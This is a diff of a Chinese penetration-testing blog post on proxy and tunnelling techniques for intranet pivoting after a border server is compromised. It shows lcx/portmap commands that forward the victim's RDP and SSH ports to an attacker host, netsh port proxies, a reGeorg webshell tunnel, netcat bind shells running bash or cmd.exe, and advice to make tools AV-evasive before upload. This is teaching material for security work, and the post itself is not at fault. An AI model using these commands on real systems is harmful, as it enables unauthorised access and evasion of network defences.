@@ -25,11 +25,13 @@
 <meta property="og:site_name" content="HackerTerry&#39;s Blog">
 <meta property="og:description" content="主要通信技术当拿到某网络主机的权限，发现无法将流量或者权限发送出来，对渗透造成了很大的影响，所以内网渗透必须需要了解到两种主要的通信技术–代理与隧道（端口转发）技术。 代理技术解决的问题：代理简单来讲解决网络之间的通信问题，如内网与外网之间或者两者自己之间的通信，两个不同内网的通信就必须借助到代理，否则无法通讯。 隧道技术解决的问题：简单来讲就是解决流量无法发送，隧道技术多用来绕过一些安全设备的监">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2022/09/17/rM3Qd9CymRAncjI.jpg">
 <meta property="article:published_time" content="2022-01-25T08:15:17.000Z">
-<meta property="article:modified_time" content="2022-09-17T10:30:08.601Z">
+<meta property="article:modified_time" content="2022-09-17T13:21:47.249Z">
 <meta property="article:author" content="HackerTerry">
 <meta property="article:tag" content="内网渗透">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s2.loli.net/2022/09/17/rM3Qd9CymRAncjI.jpg">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -268,7 +270,7 @@
         <i class="iconfont icon-chart"></i>
         
           <!-- compatible with older versions-->
-          2.3k 字
+          3.3k 字
         
       </span>
     
@@ -280,7 +282,7 @@
         
         
           <!-- compatible with older versions-->
-          20 分钟
+          28 分钟
         
       </span>
     
@@ -331,7 +333,7 @@
               <p class="note note-info">
                 
                   
-                    本文最后更新于：1 分钟前
+                    本文最后更新于：11 分钟前
                   
                 
               </p>
@@ -345,15 +347,27 @@
 <h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><h3 id="正向代理和反向代理"><a href="#正向代理和反向代理" class="headerlink" title="正向代理和反向代理"></a>正向代理和反向代理</h3><p>正向代理就是你主动请求连接服务器，反向代理就是服务器主动连接你。</p>
 <p>正向代理的典型用途是为在防火墙内的局域网客户端提供访问Internet的途径。正向代理还可以使用缓冲特性减少网络使用率；<br>反向代理的典型用途是将防火墙后面的服务器提供给Internet用户访问。反向代理还可以为后端的多台服务器提供负载平衡，或为后端较慢的服务器提供缓冲服务。<br>另外，反向代理还可以启用高级URL策略和管理技术，从而使处于不同web服务器系统的web页面同时存在于同一个URL空间下。</p>
 <h2 id="隧道（端口转发）"><a href="#隧道（端口转发）" class="headerlink" title="隧道（端口转发）"></a>隧道（端口转发）</h2><p>一般情况，在渗透测试后获取主机权限后下一步就是内网渗透，内网中的其他机器是不允许外网机器访问的。这时候，我们可以通过 <strong>隧道（端口转发）</strong> 或将这台<strong>外网服务器</strong>设置成为 <strong>代理</strong>，使得我们自己的攻击机可以直接访问与操作内网中的其他机器。实现这一过程的手段就叫做<strong>端口转发</strong>。</p>
-<h2 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h2><p>内网渗透中常用的代理工具有很多，例如lcx，nps，frp，venom，proxifier+reGeorg等等。这里我就不全部讲解了。</p>
+<p>隧道技术使用在不同的OSI层进行，大体总结了以下三种：<br>网络层：IPV6隧道，ICMP隧道<br>传输层：TCP隧道，UDP隧道，常规的端口转发<br>应用层：SSH隧道，HTTP&#x2F;S隧道，DNS隧道</p>
+<p>需要注意的是，使用某种隧道之前，需要检查环境本身是否支持这种协议的使用，才能去使用响应的隧道传输。</p>
+<h2 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h2><p>内网渗透中常用的代理工具有很多，例如lcx，nps，frp，venom，proxifier&#x2F;proxychains+reGeorg等等。这里我就不全部讲解了。</p>
 <p>1.LCX(Windows)&#x2F;Portmap(Linux)</p>
-<p>很有名的一款工具，杀软直接秒杀，上传到目标机器前要提前做好免杀。</p>
-<p>Windows：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 内网端口转发</span><br><span class="hljs-comment"># 内网失陷主机</span><br>lcx.exe <span class="hljs-literal">-slave</span> rhost rport lhost lport<br><span class="hljs-comment"># 公网代理主机</span><br>lcx.exe <span class="hljs-literal">-listen</span> lport1 lport2<br><span class="hljs-comment"># 把远程端口转发到本地</span><br>lcx.exe <span class="hljs-literal">-tran</span> <span class="hljs-number">8888</span> 目标机器ip <span class="hljs-number">3389</span><br></code></pre></td></tr></table></figure>
+<p>很有名的一款工具，杀软直接秒杀，上传到目标机器前要提前做好免杀。下载地址：<a target="_blank" rel="noopener" href="https://github.com/AA8j/SecTools/tree/main/lcx">https://github.com/AA8j/SecTools/tree/main/lcx</a></p>
+<p>下面介绍一下使用该工具的两种场景。</p>
+<p>（1）假如此时已经拿到了边界服务器的权限，但是由于防火墙限制，进网端口被限制，但可以出网，此时就可以将边界服务器的端口转发到攻击机上，然后访问攻击机的端口。</p>
+<p>边界服务器为Windows：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 攻击机上执行：</span><br>./portmap <span class="hljs-literal">-m</span> <span class="hljs-number">2</span> <span class="hljs-literal">-p1</span> <span class="hljs-number">4444</span>（本机监听端口） <span class="hljs-literal">-h2</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>（转发到目的IP） <span class="hljs-literal">-p2</span> <span class="hljs-number">3389</span>（转发到目的端口）<br><span class="hljs-comment"># 表示监听本机的4444端口，并转发到127.0.0.1的3389端口。</span><br><br><span class="hljs-comment"># m的参数说明：</span><br><span class="hljs-comment"># 1.监听port1 （p1）端口并且连接主机2（h2）的port2（p2） 端口</span><br><span class="hljs-comment"># 2.监听port1（p1）和port2（p2） 端口</span><br><span class="hljs-comment"># 3.连接主机1（h1）对应的端口和主机2（h2）对应的端口</span><br><br><span class="hljs-comment"># 边界服务器上执行：</span><br>lcx.exe <span class="hljs-literal">-slave</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">8.48</span>（转发到目的IP） <span class="hljs-number">4444</span>（转发到目的端口） <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">3389</span>（转发的本地端口）<br><span class="hljs-comment"># 表示将本地的3389端口转发到192.168.8.48的4444端口</span><br></code></pre></td></tr></table></figure>
 
-<p>Linux：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 内网失陷主机 </span><br>./portmap <span class="hljs-literal">-m</span> <span class="hljs-number">3</span> <span class="hljs-literal">-h1</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-literal">-p1</span> <span class="hljs-number">22</span> <span class="hljs-literal">-h2</span> 公网主机ip <span class="hljs-literal">-p2</span> <span class="hljs-number">4444</span> <br><span class="hljs-comment"># 公网代理主机 </span><br>./portmap <span class="hljs-literal">-m</span> <span class="hljs-number">2</span> <span class="hljs-literal">-p1</span> <span class="hljs-number">4444</span> <span class="hljs-literal">-h2</span> 公网主机ip <span class="hljs-literal">-p2</span> <span class="hljs-number">5555</span><br></code></pre></td></tr></table></figure>
+<p>边界服务器为Linux：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 攻击机上执行</span><br>./portmap <span class="hljs-literal">-m</span> <span class="hljs-number">2</span> <span class="hljs-literal">-p1</span> <span class="hljs-number">4444</span>（本机监听端口） <span class="hljs-literal">-h2</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>（转发到目的IP） <span class="hljs-literal">-p2</span> <span class="hljs-number">222</span>（转发到目的端口）<br><span class="hljs-comment"># 表示监听本机的4444端口，并转发到127.0.0.1的222端口。</span><br><br><span class="hljs-comment"># 边界服务器上执行</span><br>./portmap <span class="hljs-literal">-m</span> <span class="hljs-number">3</span> <span class="hljs-literal">-h1</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-literal">-p1</span> <span class="hljs-number">22</span> <span class="hljs-literal">-h2</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">8.48</span> <span class="hljs-literal">-p2</span> <span class="hljs-number">4444</span><br><span class="hljs-comment"># 将本地的22端口转发到192.168.8.48的4444端口</span><br></code></pre></td></tr></table></figure>
 
+<p>（2）假如此时已经拿到了边界服务器的权限，但是由于防火墙策略限制导致3389端口无法出网，此时可以将此端口映射到可以出网的端口。</p>
+<p>边界服务器为Windows：     </p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 边界服务器上执行</span><br>lcx.exe <span class="hljs-literal">-tran</span> <span class="hljs-number">53</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">8.56</span>（边界服务器ip） <span class="hljs-number">3389</span><br></code></pre></td></tr></table></figure>
+
+<p>此时远程桌面连接192.168.8.56的53端口即可。</p>
+<p>边界服务器为Linux：</p>
+<p>推荐使用ssh隧道。</p>
+<p>可能有师傅会问，既然已经把远程端口转发到本地了，为什么还要在本地再转发一次呢？这是因为<code>-slave</code>参数和<code>-listen</code>参数必须成对出现，否则连接远程桌面会一直连不上。</p>
 <p>2.netsh</p>
 <p>Windows自带的一款工具，不需要上传到目标机器。值得注意的是，它不能把本地端口转发到其它机器上。</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 把任意机器的指定端口转发到本地</span><br>netsh interface portproxy add v4tov4 listenaddress=<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> listenport=目标机端口 connectaddress=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> connectport=本机端口 protocol=tcp <span class="hljs-comment"># 添加转发策略</span><br>netsh interface portproxy delete v4tov4 listenport=目标机端口 listenaddress=目标机ip <span class="hljs-comment"># 删除转发策略</span><br></code></pre></td></tr></table></figure>
@@ -364,7 +378,7 @@
 <p>在<strong>边界服务器</strong>上传webshell后，浏览器访问边界服务器webshell所在地址，如果出现提示：<code>Georg says,&#39;All seems fine&#39;</code>，则说明连接建立成功。</p>
 <p>不过这款工具一般搭配proxifier或者proxychains使用。启用上面的脚本后，命令行会显示转发到本地的端口，这时再搭配proxifier或者proxychains使用就可以了。</p>
 <p>4.netcat(nc)</p>
-<p>这款工具太有名了，被称为“网络界的瑞士军刀”。除了用来端口转发以外，还能用来传输文件，不过这里我们不作讲解，有兴趣的自行研究进阶用法。</p>
+<p>这款工具太有名了，被称为“网络界的瑞士军刀”。除了用来端口转发以外，还能用来传输文件、端口扫描，不过这里我们不作讲解，有兴趣的自行研究进阶用法。</p>
 <p>常用命令行参数：</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-literal">-l</span> 开启监听状态<br><span class="hljs-literal">-v</span> 显示详细信息<br><span class="hljs-literal">-p</span> 指定监听的本地端口<br><span class="hljs-literal">-k</span> 客户端断掉连接时，服务端依然保持运行<br><span class="hljs-literal">-e</span> 将传入的信息以命令执行<br><span class="hljs-literal">-n</span> 直接使用 IP 地址，不进行 dns 解析过程<br></code></pre></td></tr></table></figure>
 
@@ -372,7 +386,9 @@
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># Linux主机</span><br>nc <span class="hljs-literal">-lvnp</span> 本机端口 <span class="hljs-literal">-e</span> /bin/bash<br>nc <span class="hljs-literal">-lvnp</span> 本机端口 <span class="hljs-literal">-c</span> bash<br><span class="hljs-comment"># Windows主机</span><br>nc <span class="hljs-literal">-lvnp</span> 本机端口 <span class="hljs-literal">-e</span> C:\Windows\System32\cmd.exe<br>nc <span class="hljs-literal">-lvnp</span> 本机端口 <span class="hljs-literal">-c</span> cmd<br></code></pre></td></tr></table></figure>
 
 <p>目标机则可以利用各种方式进行主动连接，例如bash反弹一句话、Python、PHP等。推荐给大家一个谷歌浏览器插件–Hack-Tools，里面可以生成各种正向连接命令，再也不用担心命令记不住了！</p>
-<p>5.nps、frp</p>
+<p>5.venom</p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45859850/article/details/119813079">Venom工具的使用（内网渗透 多级代理）_rang#的博客-CSDN博客_venom工具</a></p>
+<p>6.nps、frp</p>
 <p>由于官方文档很详细，所以这里不再讲解。</p>
 <p>还有一些极端情况，比如目标内网防火墙禁用了http协议，那么只能采用dns隧道、icmp隧道、ssh隧道了。由于篇幅有限，这里不再讲解，需要时搜索对应工具即可。</p>
 
@@ -477,9 +493,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/09/17/Burpsuite%E4%BB%A3%E7%90%86%E6%B1%A0%E6%8F%92%E4%BB%B6-IPRotate%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/" title="Burpsuite代理池插件--IPRotate配置教程">
+                      <a href="/2022/01/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E4%BA%94%EF%BC%89-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" title="内网渗透（五）--横向移动">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Burpsuite代理池插件--IPRotate配置教程</span>
+                        <span class="hidden-mobile">内网渗透（五）--横向移动</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
